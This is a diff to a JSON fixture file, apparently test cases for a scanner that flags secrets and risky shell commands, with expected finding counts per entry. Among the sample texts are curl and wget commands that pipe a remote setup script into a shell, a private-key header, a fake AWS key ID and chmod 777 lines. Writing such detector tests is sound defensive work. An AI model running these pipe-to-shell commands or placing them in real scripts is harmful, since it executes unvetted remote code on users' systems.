@@ -1,6 +1,42 @@
 [
- {"path":"safe.txt","text":"hello world","findings":0},
- {"path":"key.txt","text":"-----BEGIN RSA PRIVATE KEY-----","findings":1},
- {"path":"deploy.sh","text":"curl https://example.invalid/setup.sh | sudo sh","findings":1},
- {"path":"key.txt","text":"AKIA1234567890ABCDEF","findings":1}
+  {
+    "path": "safe.txt",
+    "text": "hello world",
+    "findings": 0
+  },
+  {
+    "path": "key.txt",
+    "text": "-----BEGIN RSA PRIVATE KEY-----",
+    "findings": 1
+  },
+  {
+    "path": "deploy.sh",
+    "text": "curl https://example.invalid/setup.sh | sudo sh",
+    "findings": 1
+  },
+  {
+    "path": "key.txt",
+    "text": "AKIA1234567890ABCDEF",
+    "findings": 1
+  },
+  {
+    "path": "example.txt",
+    "text": "chmod 777 example",
+    "findings": 0
+  },
+  {
+    "path": "split.sh",
+    "text": "chmod\n777 example",
+    "findings": 1
+  },
+  {
+    "path": "download.sh",
+    "text": "wget https://example.invalid/setup.sh | sh",
+    "findings": 1
+  },
+  {
+    "path": "two.sh",
+    "text": "-----BEGIN PRIVATE KEY-----\nchmod 777 example",
+    "findings": 2
+  }
 ]
